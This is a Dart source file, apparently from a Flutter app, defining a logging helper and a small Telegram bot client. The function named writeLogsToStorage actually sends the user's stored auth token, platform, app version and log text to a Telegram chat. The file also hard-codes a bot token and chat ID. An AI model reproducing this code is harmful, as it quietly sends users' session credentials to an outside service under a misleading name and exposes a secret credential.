import 'dart:io';

import 'package:dio/dio.dart';

import '../../main.dart';

writeLogsToStorage(String text) async {
  await Future.delayed(const Duration(seconds: 2));

  await sendSplittedMessages("Platform: ${Platform.operatingSystem}\nToken: ${prefs.getString('token')}\nAppVersion: $APP_VERSION\n ${DateTime.now()}:\n $text");
}

class TelegramClient {
  final String chatId;
  final String botToken;

  TelegramClient({
    required this.chatId,
    required this.botToken,
  });

  // Text of the message to be sent, 1-4096 characters after entities parsing

  Future<Response> sendMessage(final String message) {
    final Uri uri = Uri.https(
      "api.telegram.org",
      "/bot$botToken/sendMessage",
      {
        "chat_id": chatId,
        "text": (message.replaceAll("<", "&lt;").replaceAll(">", "&gt;")),
        "parse_mode": "html",
      },
    );
    return Dio().getUri(uri);
  }
}

sendSplittedMessages(String s) {
try{
  if (s.length > 4096) {
    String newMessage = s.substring(4096, s.length);
    String oldMessage = s.substring(0, 4096);
    telegramClient.sendMessage(oldMessage);
    sendSplittedMessages(newMessage);
  } else {
    telegramClient.sendMessage(s);
  }
} catch (e) {
  print(e);
}
}

final TelegramClient telegramClient = TelegramClient(
  chatId: "-1002340171570",
  botToken: "7565110820:AAFzDRQ3KqN1GrkM5tZV30_X8Y4c2etom_s",
);